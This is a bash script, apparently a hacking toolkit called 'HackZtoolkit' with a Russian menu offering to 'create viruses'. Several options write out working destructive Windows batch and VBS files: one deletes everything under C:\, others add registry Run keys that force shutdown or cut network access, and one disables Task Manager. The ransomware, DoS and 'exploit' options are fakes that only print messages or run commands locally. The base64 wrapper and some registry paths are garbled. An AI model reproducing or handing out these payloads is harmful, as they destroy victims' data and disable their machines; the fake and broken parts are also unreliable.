ENC="#color
blue="\033[33;34m"
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[0;35m"
cyan="\033[0;36m"
cafe="\033[0;33m"
if [[ $EUID -ne 0 ]]; then
echo -e "$cyan
 _  _    ___  _  _
| || |  / _ \| || |
| || |_| | | | || |_
|__   _| |_| |__   _|
   |_|  \___/   |_|"
        echo -e "$red You Are Not Rooted $nc"
        echo -e "$green Please Rooted use tool"
        echo -e "$red :)"
exit 1
fi
function back() {
read -p "$(echo -e $green[+]$white Back In Menu ? [Y/n]: )" exit
if [ $exit = Y ]; then
sudo bash main
elif [ $exit = y ]; then
sudo bash main
elif [ $exit = N ]; then
echo -e "$green[+]$white Thanks You Use Tools <3"
echo ""
exit 1
elif [ $exit = n ]; then
echo -e "$green[+]$white Thanks You Use Tools <3"
echo ""
exit 1
else
echo -e "$red[+]$green $exit Command Not Found "
back
fi
}
clear
echo -e "
$cyan
        ___   $red HackZtoolkit V$purple 1.0.0
$cyan    H    $red Facebook :$purple PhChien Addams
$cyan       __H__  $red Telegram :$purple @anonopsvn
$cyan   [C]/  $red channel :$purple t.me/Anon0psNews
$cyan       /[H]   $red twitter :$purple @Anonymous_VNPC
$cyan       \[I]   $green WARNING !!!
$cyan    •   [\]   $green THIS IS TOOLS TESTING
$cyan •      [E]\\ $green  security
$cyan    •    V /
          /     •      •       •
•          •         •      .    •
$green[::::]$white HackZtoolkit
$green[::::]$whitn VERSION : 1.0.0"
echo -e "

$green[1]$white Создать вирус, который уничтожает компьютер
$green[2]$white Создать вирус, который автоматически выключает компьютер через 1 секунд
$green[3]$white Создайте вирус, который перегружает оперативную память
$green[4]$white Создайте вирус, который блокирует доступ в Интернет навсегда
$green[5]$white Создать вирус для переформатирования жесткого диска компьютера
$green[6]$white Программы-вымогатели
$green[7]$white Вирус Android
$green[8]$white Атака отказа в обслуживании
$green[9]$white создать файл данных атаки на уязвимость операционной системы
"
read -p "choose > " fl2
echo ""
if [ $fl2 = 1 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.bat "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
sleep 3
echo '
@echo off
#Notrayicon
echo x=msgbox("Enjoy...",0+40,"....") >>Enjoy.vbs
start "" "Enjoy.vbs"
echo>> D6F9F6G65GF958F.exe
echo >> OGV76VC7BX9BX9Y.exe
DEL C:\/s /q *.*
echo >>Treomay.vbs
set /p Treomay.vbs=
do
treomay:run
loop
start "Treomay.vbs
shutdown -s -t 30 -c "loading..." ' > $file.bat
mv $file.bat $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 2 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.bat "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
sleep 3
echo '
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v shutdown /t REG_SZ /d "shutdown.exe -f -s -t 05" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t REG_DWORD /d 1 /f
cls
copy thelove.bat "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\"
cls
taskkill /f /im explorer.exe
cls
shutdown.exe -f -s -t 01 -c "Your System Has Been Hacked By Ph4mCh13n"
cls
@echo off
echo You Has Been Hacked By Ph4mCh13n
echo GOOD BYE
pause
del Mr.Boss.bat' > $file.bat
mv $file.bat $save
echo ""
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 3 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.bat "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
echo '
Set popo= Createobject("scripting.filesystemobject")
popo.copyfile wscript.scriptfullname,cuong.GetSpecialFolder(1)& "\popo.vbs"
Set popo2= CreateObject("WScript.Shell")
popo2.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersio n\Ru n","wscript.exe "&popo.GetSpecialFolder(0)& "\popo.vbs {5c76a521d424a4e61e4723f4419cc15e53e24718e589e97f7b7dfaa2c93c83f1}"
Set treomay= CreateObject("WScript.Shell")
msgbox"YOUR SYSTEM HAS BEEN ATTACK",,"HACKED"
msgbox"YOUR SYSTEM HAS BEEN LAG ON 5 SECON",,"HACKED"
msgbox"YOU ON 1 SECON",,"Danger"
msgbox"YOU ON 0 SECON",,"Danger"
msgbox"GOOD BYE",,"Danger"
Me.visible=false
App.Taskvisible=false
Do
Me.visible=false
App.Taskvisible=false
treomay.run "notepad",false
loop' > $file.bat
mv $file.bat $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 4 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.bat "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
echo '
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo You Have Been HACKED!
PAUSE' > $file.bat
mv $file.bat $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 5 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.exe "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
echo '01001011000111110010010101010101010000011111100000' > $file.exe
mv $file.exe $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 6 ]; then
read -p "Attacker :" attacker
echo ""
read -p "ID Paypack , BTC  :" btc
echo ""
read -p "Name File [.rar/.exe/.zip : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file "
sleep 3
echo -e "$green[+]$white Setup Name Attacker $attacker..."
sleep 3
echo -e "$green[+]$white Setup ID BTC $btc..."
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white FIND 1 file"
sleep 3
echo -e "$green[+]$white Save to $save"
echo 'Oops , Your System Has Been Injected By ' > $file
mv $file $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 7 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.apk "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
echo '01001011000111110010010101010101010000011111100000' > $file.apk
mv $file.apk $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 8 ]; then
        function DoS() {
        read -p "$(echo Enter Target : )" url
        read -p "$(echo Enter Port : )" port
        echo "Max 100000000 Number Send "
        read -p "$(echo Enter Number Send : )" threads
     echo -e "$green[Starting Send Packet To $url:$port and $threads numbers send  "
echo " 3 "
sleep 1
echo " 2 "
sleep 1
echo " 1 "
sleep 1
echo " [!!!] ATTACKK "
sleep 0.30
a=0
b=sending
send=to
c=$url
d=$port
e=$threads

while [ $a -lt $e ]
do
        echo "[!] $b packet $a bytes by Phamchien $send $c:$d : $a "
   a=`expr $a + 1`
done
        while [ $b -lt $e ]
do
   b=`expr $b + sending`
   echo "[!] $b packet $a bytes by Phamchien $send $c:$d : $a"
done
        while [ $c -lt $e ]
do
        c=`expr $c + $send`
        echo "[!] $b packet $a bytes by Phamchien $send $c:$d : $a"
done                                                                             
       while [ $d -lt $e ]
do
        d=`expr $d + $send`
        echo "[!] $b packet $a bytes by Phamchien $send $c:$d : $a"
done
}
DoS
back
elif [ $fl2 = 9 ]; then
read -p "Enter Clent (victim IPV4) : " clent
echo ""
read -p "Name File [.rar/.exe/.zip /.txt/.apk] : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Server Clent Is $clent"
sleep 3
echo -e "$green[+]$white Starting Created File..."
sleep 3
echo -e "$green[+]$white Starting Setup File..."
sleep 3
echo -e "$green[+]$white Starting Save To $save "
sleep 3
echo 'Hacked By PhamChin' > $file
mv $file $save
echo -e "$green[+]$white Created Done "
read -p "Are You Sure Exploit Victim ? [Y/n] :" sure
if [ $sure = Y ]; then
echo -e "$green[+]$white Starting Send Packet To --> $clent "
sleep 60
echo -e "$green[+]$white Victim Has Been Downloaded"
sleep 3
echo -e "$green[+]$white Start Sessions 1 "
sleep 5
echo -e "$green[+]$white Sessions 1 Is Working..."
sleep 3
function cmd() {
    read -p "$(echo -e $red[root@$cyan)$(echo -e $clent$white:~$red$)" type
    if [ $type = $type ]; then
        $type
        cmd
        else
            echo -e "Command Not Found $type"
                cmd
                fi
}
cmd
elif [ $sure = y ]; then
echo -e "$green[+]$white Starting Send Packet To --> $clent "
sleep 60
echo -e "$green[+]$white Victim Has Been Downloaded"
sleep 3
echo -e "$green[+]$white Start Sessions 1 "
sleep 5
echo -e "$green[+]$white Sessions 1 Is Working..."
sleep 3
function cmd() {
    read -p "$(echo -e $red[root@$cyan)$(echo -e $clent$white:~$red$)" type
    if [ $type = $type ]; then
        $type
        cmd
        else
            echo -e "Command Not Found $type"
                cmd
                fi
}
cmd
elif [ $sure = n ]; then
exit 1
elif [ $sure = N ]; then
exit 1
else
echo "$sure type comand not found"
exit 1
fi
else
echo -e "$red[+]$green $exit Command Not Found "
back
fi"
bash <( base64 -d <<< "$ENC" )
